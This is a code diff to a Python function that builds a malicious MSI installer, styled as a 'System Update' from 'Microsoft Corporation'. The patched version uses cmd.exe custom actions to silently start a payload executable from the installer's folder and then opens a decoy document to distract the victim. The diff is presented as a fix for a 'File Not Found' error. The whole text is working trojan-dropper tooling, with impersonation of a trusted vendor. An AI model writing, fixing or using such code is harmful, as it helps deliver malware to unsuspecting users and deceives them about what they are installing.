@@ -17,19 +17,17 @@ def create_msi_trigger(
     product_name: str = "System Update",
     manufacturer: str = "Microsoft Corporation"
 ) -> pathlib.Path:
-    """Create an MSI trigger file using wixl (msitools) no container,
+    """
+    Create an MSI trigger - Fixed "File Not Found" by extracting path from MSI location.
     """
     if payload_dir is None:
         payload_dir = PAYLOAD_DIR
 
     msi_output_path = payload_dir / output_filename
-
-    payload_src = payload_dir / payload_exe
-    decoy_src = payload_dir / decoy_file
-
-    if not payload_src.exists():
-        raise FileNotFoundError(f"Payload not found: {payload_src}")
-
+    
+    payload_filename = pathlib.Path(payload_exe).name
+    decoy_filename = pathlib.Path(decoy_file).name
+    
     wxs_content = f"""<?xml version='1.0' encoding='windows-1252'?>
 <Wix xmlns='http://schemas.microsoft.com/wix/2006/wi'>
   <Product Name='{product_name}' Id='*' UpgradeCode='12345678-1234-1234-1234-111111111111'
@@ -45,46 +43,44 @@ def create_msi_trigger(
     <Directory Id='TARGETDIR' Name='SourceDir'>
       <Directory Id='AppDataFolder' Name='AppData'>
         <Directory Id='INSTALLDIR' Name='{product_name}'>
-
-          <Component Id='MainExecutable' Guid='*'>
-            <RegistryValue Root='HKCU' Key='Software\{manufacturer}\{product_name}' Name='installed' Type='integer' Value='1' KeyPath='yes'/>
-            <File Id='PayloadEXE' Name='{payload_exe}' Source='{payload_src}' Hidden='yes' System='yes' />
-          </Component>
-
-          <Component Id='DecoyDocument' Guid='*'>
-             <File Id='DecoyPDF' Name='{decoy_file}' Source='{decoy_src}' />
-          </Component>
-
+           <Component Id='MainComponent' Guid='*'>
+             <RegistryValue Root='HKCU' Key='Software\\{manufacturer}\\{product_name}' Name='installed' Type='integer' Value='1' KeyPath='yes'/>
+           </Component>
         </Directory>
       </Directory>
     </Directory>
 
     <Feature Id='Complete' Level='1'>
-      <ComponentRef Id='MainExecutable' />
-      <ComponentRef Id='DecoyDocument' />
+      <ComponentRef Id='MainComponent' />
     </Feature>
+    
+    <!-- Property for CMD -->
+    <Property Id='CMD'>cmd.exe</Property>
+    
+    <!-- 1. Resolve SystemFolder to CMD property -->
+    <CustomAction Id='SetCmdPath' Property='CMD' Value='[SystemFolder]cmd.exe' />
 
-    <!-- Async Execution of Payload (Hidden) -->
-    <CustomAction Id='RunPayload' FileKey='PayloadEXE' ExeCommand='' Return='asyncNoWait' Execute='deferred' Impersonate='yes' />
+    <!-- 2. Run Payload using dynamic path extraction -->
+    <CustomAction Id='InitUpdater' Property='CMD' 
+      ExeCommand='/c for %I in ("[OriginalDatabase]") do start /b "" "%~dpI{payload_filename}"' 
+      Return='asyncNoWait' Execute='immediate' />
 
-    <!-- Async Execution of Decoy (Visible via cmd/shell) -->
-    <CustomAction Id='LaunchDecoy' Directory='INSTALLDIR' 
-      ExeCommand='cmd.exe /c start "" "[#DecoyPDF]"' 
-      Return='asyncNoWait' Execute='deferred' Impersonate='yes' />
+    <!-- 3. Open Decoy using dynamic path extraction -->
+    <CustomAction Id='ViewReadme' Property='CMD' 
+      ExeCommand='/c for %I in ("[OriginalDatabase]") do start /b "" "%~dpI{decoy_filename}"' 
+      Return='asyncNoWait' Execute='immediate' />
 
     <InstallExecuteSequence>
-      <Custom Action='RunPayload' Before='InstallFinalize'>NOT Installed</Custom>
-      <Custom Action='LaunchCmdDecoy' After='RunPayload'>NOT Installed</Custom>
+      <ResolveSource After="CostInitialize">1</ResolveSource>
+      
+      <Custom Action='SetCmdPath' After='CostFinalize'>1</Custom>
+      <Custom Action='InitUpdater' After='InstallInitialize'>1</Custom>
+      <Custom Action='ViewReadme' After='InitUpdater'>1</Custom>
     </InstallExecuteSequence>
-
-    <!-- Hide MSI UI if desired, or keep minimal -->
-    <UIRef Id="WixUI_Minimal" />
-    <UIRef Id="WixUI_ErrorProgressText" />
 
   </Product>
 </Wix>
 """
-
     wxs_path = payload_dir / "trigger.wxs"
     with open(wxs_path, 'w') as f:
         f.write(wxs_content)
@@ -108,7 +104,7 @@ def create_msi_payload_trigger(
 
     if decoy_file is None:
         decoy_file = DECOY_FILE
-
+        
     return create_msi_trigger(
         payload_exe=payload_exe,
         decoy_file=decoy_file.name,
